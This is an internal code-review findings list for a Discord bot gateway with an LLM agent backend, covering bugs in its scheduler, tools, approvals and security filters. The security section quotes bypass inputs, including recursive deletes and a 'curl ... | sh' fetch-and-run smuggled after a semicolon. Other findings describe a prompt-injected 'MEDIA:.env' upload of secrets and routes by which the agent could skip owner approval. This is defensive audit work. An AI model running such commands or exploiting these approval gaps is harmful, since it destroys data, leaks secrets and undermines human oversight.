# Full re-review 2026-10-13 - lead falsification

## main-runtime-b
- [P1 CONFIRMED] RuntimeOwnershipLock never acquired in production (entry.rs:241 defined; only used by test entry.rs:316-330; grep finds no other caller; no pidfile/flock alternative). Trigger: manual `run` while launchd instance runs -> two gateways on one DB + tokens (duplicate replies, double cron). Fix: acquire in run_gateway_with_optional_dashboard before startup branches.
- P2 x7 recorded (lock in shared /tmp, dashboard error masking, profile cmd default DB, readiness provider check, readiness probe via proxy, drain temp-file leak, env-mutating tests).

## agent-backend
- [P1 CONFIRMED, pre-existing] omo_backend.rs:1186-1193 every Text frame (incl. steer acks id>=9100) renews last_activity_at and the interactive deadline; with messages_delivered==0 a steer is sent every 12s, so a hung interactive turn never times out. Same code at HEAD:1169.
- [P1 CONFIRMED, product decision needed] mid-turn status is emitted as is_final=false and counted in messages_delivered, but DiscordEgress::stream (adapter.rs:3053-3057, completed_stream_content) drops non-final chunks. User sees nothing mid-turn, and the steer guard is disarmed. NOTE: last round made these final and reverted it because existing tests (TASK14, U12, wiring) pin non-final mid-turn behavior. Fixing needs a decision: show mid-turn status in Discord (change tests) vs. stop counting them as delivered.
- [P2, defect in last round's new code] cron briefings are marked injected before turn/start; a model-reject fallback or ack failure loses them. Fix: take once in run(), pass to both attempts.
- P2 x6 recorded (settings-update rejection no fallback, deadline drain stops on non-Text frame, default auto-approve ignores /yolo off and toolset only gates commands, steer ambiguous ack -> duplicate turn, cron settings.json overwrite on parse error, dead omo_activity module).

## tools-exec
- [P1 CONFIRMED, pre-existing] web.rs:79 splits on exact `<div class="result__body">`; live DuckDuckGo markup (fetched now) uses `class="links_main links_deep result__body"`, so web_search returns no results every time. Title/href extraction also wrong (result__url, uddg redirect).
- [P1 CONFIRMED, pre-existing] file.rs with_write_approval has no caller in src -> file write never asks approval; OMON_TOOL_ROOTS defaults to $HOME, so ~/.zshrc, ~/.ssh/authorized_keys writable silently while terminal asks for the same write.
- [P1 CONFIRMED, pre-existing] terminal.rs:422/430 kills the process group when one pipe exceeds max_output_bytes (100KB); HEAD:402 also start_kill. A long-output mutating command (cargo build, migration) is killed midway.
- [P1 CONFIRMED, my own R1 fix is ineffective] browser.rs:310 final-URL check reads /json/list immediately after /json/new (tab not yet navigated) and fails open when the list can't be read; redirect/rebinding protection is effectively absent.
- P2 x7 recorded (MCP stdio hang/no initialize - runtime has no MCP client; env denylist incomplete; caller env overrides OMON_SESSION_*; terminal inherits gateway secrets via env; reader/group leak on drop; SSRF range gaps, unbounded owned_tabs, file search/write hardening).

## dashboard
- [P1 CONFIRMED] dashboard.rs:1598 update_cron_job: CronJobInput.payload #[serde(default)] -> omitted payload becomes null and is upserted; session_key cleared; repeat counters reset.
- [P1 CONFIRMED] dashboard.rs:872-880 readiness reads config.appserver_url / OMON_APPSERVER_URL which nothing sets (real var OMON_OMO_APPSERVER_URL), so backend_ok is ignored -> /api/ready 200 while agent backend is down. (Same as last round's P2; regraded P1: health check false positive with concrete trigger.)
- P2 x10 recorded.

## web-deploy
- 4 reported P1s are in one-shot cutover/seed scripts (scripts/cutover_*, rollback_*, seed_omomeow_crons.sql, commit 9cd2aa2). Code confirmed (INSERT OR REPLACE; sed overwrites whole DISCORD_BOT_TOKENS line and rm .bak; pkill -f omon-gateway self-kill; phase1 disables legacy before DB check). Regraded P2 for consistency with round 1 ruling: one-shot migration scripts already executed, not runtime code. Recommend deleting or fixing before any re-use.
- P2 recorded: verify_phase2 gate always PASS; crontab edits not idempotent; deleted sessions stay in message_search_documents (no DELETE trigger); FTS keyed on implicit rowid; migration 0041 FK drop (already applied); web playground auto-loads remote images.

## cron-scheduler
- [P1 CONFIRMED] scheduler.rs:1575 complete_success uses next_run_tz(...)? inside the completion tx (complete_failure handles the same error by disabling). Trigger: recurring job with no further occurrence (year-bounded cron) or bad timezone -> run rolls back to running, job re-executes each lease cycle; if outside catch-up window, claim_job's next_run_tz? propagates out of run_due_jobs and blocks every later job.
- [P1 CONFIRMED] scheduler.rs:52-60 should_reclaim trusts a live owner_pid; cron_runs has no owner_started_at. Trigger: Docker restart reusing the PID, or same-process executor panic -> running lease unreclaimable ~150 min, job blocked.
- [P1 CONFIRMED] scheduler.rs:146-160 resolve_predecessor_output legacy fallback session_key LIKE '%:<id>' over all messages; context_from is agent-settable (tools/cron.rs). Trigger: context_from = a user/bot id -> another session's latest assistant message injected into the cron prompt and delivered. Cross-session disclosure.
- P2 x4 recorded (obligation id ms collision, cron_outputs insert error swallowed, ShellAndPayload executor no timeout (not prod), interval overflow panic).

## security
- [P1 CONFIRMED by direct regex evaluation] normalize.rs:14 EMPTY_QUOTES_RE literal r#"''|""""# has content ''|""" (3 double quotes). Evaluated: rm -rf /"" => rm -rf /"" ; rm -rf ~"" => rm -rf ~"" ; rm -rf /'' => rm -rf /. So rm -rf /"" , ~"" , /etc"" escape the hardline rm path rule. Under yolo / ApprovalPolicy::Never hardline is the only gate; the dangerous rule still catches root delete so Smart policy prompts.
- [P1 CONFIRMED] normalize.rs:674-696 + 1042-1060: echo/printf non-dash args are blanked in grep_safe, and the unblanked normalized string is never pushed as a variant. Trigger: cron script / ack_command 'echo "$(rm -rf ~)"' passes check_cron_script, then sh -c runs the substitution. Terminal tool mostly unaffected (its sh -c payload is added unblanked).
- [P1 CONFIRMED] dangerous.rs:305-335 is_verification_artifact_cleanup runs on the raw command with split_whitespace len==3 and string-prefix checks, returning None before any detection: 'rm -f /tmp/hermes-verify-a;curl${IFS}http://e/x.sh|sh' passes dangerous detection.
- [P1 CONFIRMED] dangerous.rs:66 TRUNCATE rule (case-insensitive, TABLE optional) and DELETE FROM rule are applied by scan_cron_prompt (scan.rs:133-137) to natural-language prompts: 'truncate the report to 500 words' rejects the cron job.
- P2 x5 recorded (kill -1 <pid> hardline; broad -c always-grant key; neutralizer misses Unicode tag chars; ZWNJ rejected; deny glob anchoring/quadratic).

## discord-adapter (a+b, deduplicated)
- [P1 CONFIRMED] adapter.rs:37 MEDIA_DIRECTIVE_RE is case-insensitive with no word boundary; evaluated: ["Social media: Twitter and Reddit","Twitter"] ; ["multimedia: foo","foo"]. validate_media_path(...)? at :3111/:3241 then returns Err for a nonexistent path and aborts the whole SendMessage / final stream (blank placeholder left).
- [P1 CONFIRMED] adapter.rs:44-80 validate_media_path allows anything under the process cwd (is_in_cwd); deny list covers only /etc,/proc,/sys,.ssh,.gnupg. Gateway cwd holds .env and the default sqlite DB, so a model/prompt-injected 'MEDIA:.env' uploads secrets to the channel.
- [P1 CONFIRMED] adapter.rs:565-571 coalesce_inbound_events rebuilds via InboundEvent::message, dropping author_id and referenced_message_id for multi-message debounce batches -> empty author in search index, owner-reply classification and owner/bot exclusion broken for split messages.
- [P1 CONFIRMED] adapter.rs:766 spawn_receive_watchdog is only called from DiscordAdapter::start; production starts clients via join_set.spawn(client.start()) (main.rs:1224) and never calls it -> zombie gateway self-heal never runs.
- P2 x14 recorded across a/b (403 marks whole channel dead + probe consumed by typing; unordered dead-target DB spawns; streams mutex across network send; debounce batches routed out of order; /stop replay via backfill; thread_sessions_per_user unused; content logged before auth; UploadFile bypasses path check; hard-coded owner id fallback; lane bind mismatch aborts; live path never advances bot cursor; <think> leaks on SendMessage/Edit; ChannelId::new(0) panic; cursor write SQLITE_BUSY).

## multiplexer
- [P1 CONFIRMED] actor.rs:313-330 replay dedup: an existing transcript row with the same platform_message_id is treated as 'already processed' and the delivery is completed Ok without running. persist_inbound inserts the user row before the turn, so a failed turn that is later reclaimed (record_incoming_as reclaims failed rows) is silently marked delivered and never processed.
- [P1 CONFIRMED] router.rs:656-664 mark_in_flight_resume_pending marks EVERY resident session resume_pending on graceful shutdown, not only those with an active turn. A session whose last turn failed (error not persisted, user row last) is re-run on restart; side effects repeat.
- [P1 CONFIRMED] router.rs set_model/set_yolo/reset return Ok(()) on SendOutcome::Retiring without retry (router.rs:628 'let _ = handle.reset()'), while route/stop wait_until_reusable. During a GC retire window /yolo off or /reset reports success but the live actor keeps old state and flush() overwrites the DB (yolo re-enabled).
- P2 x7 recorded.

## lanes-surface
- [P1 CONFIRMED] posts.rs:355 rename_status and :385 edit_status are awaited without timeout (send is wrapped in timeout(30s) at :221/:404). Called inline from the single serve loop; a Discord 429 sleep or hung HTTP stalls all lanes. (Discord rename rate limit itself not verified.)
- P2 x8 recorded (BEGIN IMMEDIATE held across archive on insert failure, unscrubbed claim evidence, post-commit start error, non-atomic send, deferred transition tx, orphan thread per tick, HEAVY_SLOTS=0 hang, cwd-relative DATABASE_URL).

## agent-runtime
- [P1 CONFIRMED] omo_daemon.rs:405-445 restart circuit: 3 restarts in window, or one replacement not ready within 30s, sets shutdown=true and the watcher returns permanently. is_available() has no production reader (only tests). The gateway keeps running, so launchd never restarts it; every turn then fails until a manual restart.
- P2 x8 recorded (auth_token in derived Debug/Serialize; lane/kibitzer/triage backends get no workspace root; wipe_omo_thread_bindings not wired; daemon log/token dir default perms; --ws-auth off zero-config; LlmClient headers not sensitive + x-api-key forwarded on redirect; tool-call name append; LlmClient edge cases).

## lanes-signals
- [P1 CONFIRMED] settle.rs:315 done_diff loop 'if size > budget { break; }': one file over the 256 KiB budget (lockfiles sort before src/) stops the loop and drops every later file -> empty/partial diff -> jev fulfills 0 -> lane bounced to not_done with an objection the agent cannot fix.
- [P1 CONFIRMED] kibitzer.rs:245-250 state_document (up to 6000 chars, Home DM section last) is passed through scrub_for_external which caps at 4000 (judge/mod.rs:20-22); generation is consumed before (kibitzer.rs:238) -> owner DMs usually cut off and the wake is lost.
- P2 x11 recorded (arm_owner unwired, post-reservation error loses generation and stops lane service, unscrubbed failure detail in objection/history/inbox, stale now, worktree verification fail-closed, whole-file reads before budget, deliverable substring filter, command signals with full env + unbounded output, splitter quote handling, kibitzer fence parsing, scrub gaps).

## discord-commands
- [P1 CONFIRMED] commands.rs:491 skill_dispatch and :621 memory call ctx.defer() (public), then pending_command attaches full payloads; PendingScope::Skills permits() is Ok(true) for every session (db.rs:653). Trigger: '/skills action:pending' in a guild channel -> staged skill payloads from all sessions (incl. other users' DMs) posted publicly to the channel.
- P2 x8 recorded (/retry non-transactional + loses platform_message_id; /reset wipes DB before actor; interaction id as platform_message_id; slow commands not deferred; /compress lossy fallback when llm None; global skill approve scope; button restart/restore; pending list all-or-nothing).

## tools-context
- [P1 CONFIRMED] CronTool has no requires_approval override (only mod.rs default None) and check_cron_script only does lifecycle+hardline+dangerous. Under APPROVAL_MODE=always or user deny globs (enforced only in TerminalTool), the agent can schedule 'cron add script: <any non-dangerous command>' and it runs unattended via sh -c. Operator policy is bypassed through cron.
- [P1 CONFIRMED] message_search.rs:190-233 ingress indexes thread messages with channel_id = parent channel (session.channel_id) + thread_id; search SQL (:143-170) filters only platform + channel_id. Trigger: message_context search from the parent channel returns private-thread messages.
- P2 x10 recorded.

## storage-ledger
- [P1 CONFIRMED] db.rs:488-515 find_last_unfinished_user_turn reads only the single highest-sequence row of the session. mirror_to_session (mirror.rs:39) appends cron/system mirror rows (role assistant) to the same session. Trigger: a user turn is running/queued with resume_pending=1, a cron delivery mirrors into that channel, then the gateway restarts -> last row is the mirror assistant row -> recovery clears the marker and the user's message is never re-run.
- P2 x12 recorded (unparsable key rebuilt -> marker never cleared; dead recover fn; is_session_suspended fails open; non-atomic suspended RMW; debounced batch cannot reclaim failed + one seen constituent drops batch; constituent writes swallowed; recovery loop aborts / duplicate resend; sweep skips legacy NULL owner rows on PID reuse; cron briefings consumed before turn + truncation marks dropped rows; in-memory pool recycling; memory store edge cases; message_search/policy minor).

## cron-store-exec
- [P1 CONFIRMED] report.rs:288-289 the native socket accepts {"approve_problem":id} and calls remediate::approve_rerun with no owner credential; the CLI --owner-approved flag is discarded (report.rs:385 owner_approved: _). Any same-user process (incl. the remediation lane agent, which can read problem ids via cron health --json) can approve and rerun a publishing job. The owner-approval gate is not enforced.
- [P1 CONFIRMED] remediate.rs:260 claims a problem to 'remediating'; no code path moves a stale 'remediating' row back (grep: only :260 and :425 set it). A restart during a transient rerun strands it; the health upsert (health.rs:80-86) reopens only fixed/ignored, so recurrences are silently suppressed and the owner is never told.
- [P1 CONFIRMED] health.rs:73-74 signature = kind + full error text, dedup UNIQUE(job_id,kind,signature). A job whose stderr varies per run (timestamps, pids) creates a new problem row, judge call and possibly a new agent lane on every failure. Unbounded fan-out for one fault.
- P2 x6 recorded (unscrubbed error text in digest/inbox/brief; duplicate escalation after transient rerun; approval after exhausted budget is a no-op; retention days overflow panic + prune only at boot; ack timeout leaves grandchildren; native socket hardening; notepad quota race + key mismatch).

## main-runtime-a
- [P1 CONFIRMED] main.rs:1254-1262 drain arm of the final select!: any change of drain_rx completes the select, but the body only acts when the new value is true. scan_at (main.rs:914) runs before receiver() (:918), so a marker present at boot is the initial value. Clearing/expiring it flips true->false, changed() resolves, the arm does nothing, and the code falls through to the shutdown sequence -> gateway exits 0 without flush/mark/shard shutdown. Cancelling a drain stops the bot.
- P2 x9 recorded (recovery redispatch new id/no delivery_id/duplicate attachments; startup auth ignores roles + ingress authors; mail/imsg watchers die on one failure; debounce batches dropped on drain/lane/discord-failure shutdown; parse_bool typo disables safety flags; DISCORD_ALLOWED_USERS lossy parse -> open pairing; System Settings opened every boot; hardcoded owner id + mail account; cron llm base_url keeps base api key (dead code)).

## lanes-runner
- 0 P0/P1. P2 x7 recorded (reopen renames before unarchive (possible P1 if Discord rejects archived-thread rename, unverified); failed owner reply parked forever; free-text reason can forge 'reopened' marker; crash mid worktree restore unrecoverable; one cron_problem error aborts dispatch tick; duplicate transcript row on replay; predictable /tmp socket path).

## discord-auth
- [P1 CONFIRMED] table_render/mod.rs:322-355: the table is replaced by a placeholder before upload, original_text is never used outside tests (grep), and upload failure propagates with ? (adapter.rs:3128 before the stream entry is removed). Trigger: bot lacks Attach Files in a channel -> reply sent without the table, stream retry no-ops on last_sequence.
- [P1 CONFIRMED] table_render/mod.rs:8-18 parse_table_row splits on every '|', including escaped \| and pipes inside backticks; extra cells are dropped when rendering. Trigger: LLM table with `cmd | wc -l` in a cell -> wrong/missing data in the image, original text already removed.
- [P1 CONFIRMED] throttler.rs:200 start_typing(...).await? runs before the final edit/send, also when is_final. A transient typing error aborts the final update -> placeholder stays, answer not shown (some omo_backend callers ignore the error).
- [P1 CONFIRMED] pairing.rs:461 an unknown code bumps attempts on ALL pending codes (no code= filter); :469 locks any row with attempts>=5 permanently (no time component). Trigger: 5 operator typos -> every pending user's correct code returns LockedOut after the platform lockout ends.
- [P1 CONFIRMED, overlaps security P2] dangerous.rs:376-387 derive_pattern_key for non-dangerous commands = first 3 whitespace tokens; in APPROVAL_MODE=always an 'Always Allow' on 'ls -la /tmp' pre-approves 'ls -la /tmp; <anything non-dangerous>' globally and persistently. Graded P1 because always mode exists to prompt every command.
- P2 x8 recorded.

## sessions-judge
- [P1 CONFIRMED] control.rs:162-175 session() builds a fresh registry, ignores list.errors, and maps an empty listing to ControlError::NotRunning; drive treats NotRunning as fatal immediately (external.rs:300-312) and the runner fails the lane 'dead'. Trigger: one ssh timeout/VPN blip while sending to a remote adopted lane -> healthy lane permanently failed.
- [P1 CONFIRMED] control.rs:200 output() wraps every remote call in a fixed 20s timeout; remote Done-signal command checks use it (external.rs:417-424) while the local runner allows 120s. Trigger: done signal 'command ["cargo","test"]' on a remote lane -> every settle rejects the claim, lane loops claim/reject forever.
- [P1 CONFIRMED] external.rs:67 adopt only checks the goal is non-empty; send_goal (:158-177) flattens only the footer, not the goal; remote send rejects multi-line text. Trigger: adopt a remote target with a multi-line --goal -> adopt reports success, goal never sent, lane fails after 3 errors.
- P2 x8 recorded (3-error rule counts wakes not time; assistant_items aborts on one non-text entry and wedges the cursor; Instant::now()-age panic after reboot; ssh without -- for registry hosts; JevCli daily caps per instance and reset on restart; breaker reset by non-trigger failures; judge temp file default perms + set_var in async; duplicate external.sql).

## inbox-migrate-voice
- [P1 CONFIRMED] mail.rs:47 inbox item source_ref = Gmail thread_id; mod.rs:222 INSERT ... ON CONFLICT(source, source_ref) DO NOTHING. Trigger: a new unread message arrives in an already-collected thread -> new snippet never stored, triaged, or shown in the digest.
- [P1 CONFIRMED] work_heartbeat.rs:325 post_message(...).await? inside the per-item loop; a failing item (deleted thread, bad thread_id, >2000 chars) aborts step(), keeps its old last_progress_at and sorts first every tick -> every other stale item never gets a heartbeat or dead-worker alert.
- [P1 CONFIRMED] proposals.rs:136 lookup result up to 64 KiB returned as owner_text; adapter.rs owner DM path sends it as one message (code shown below). Trigger: approved Lookup of a mail/discord page -> Discord rejects >2000 chars, proposal already completed, owner sees nothing.
- P2 x14 recorded.

## TOTAL
- 22/22 lane reports in r1/. Lead-confirmed P1: 46. P0: 0. web-deploy's 4 reported P1s regraded P2 (one-shot scripts).
